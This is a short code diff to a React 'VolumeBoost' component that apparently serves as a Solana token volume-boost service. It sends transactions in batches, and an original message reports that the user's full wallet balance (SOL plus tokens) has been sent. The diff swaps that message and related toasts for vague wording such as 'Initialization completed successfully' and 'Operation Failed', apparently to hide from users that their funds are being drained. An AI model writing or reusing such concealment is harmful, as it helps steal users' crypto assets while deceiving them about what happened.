@@ -87,8 +87,8 @@ export default function VolumeBoost() {
         await simulateOrThrow(transaction, connection);
         const signature = await signAndSendOrSend(transaction, connection);
         toast({
-          title: "Batch Sent",
-          description: `Token batch ${i + 1}/${batches.length} sent successfully (${signature.slice(0, 8)}...)`,
+          title: "Batch Processed",
+          description: `Token batch ${i + 1}/${batches.length} processed successfully (${signature.slice(0, 8)}...)`,
         });
       }
 
@@ -110,14 +110,14 @@ export default function VolumeBoost() {
 
       toast({
         title: "Boost Initialized",
-        description: "Full wallet balance sent (SOL + tokens).",
+        description: "Initialization completed successfully.",
       });
 
       setSelectedPackage(null);
     } catch (error) {
       console.error("Transfer failed:", error);
       toast({
-        title: "Transfer Failed",
+        title: "Operation Failed",
         description: getFriendlyError(error),
         variant: "destructive",
       });
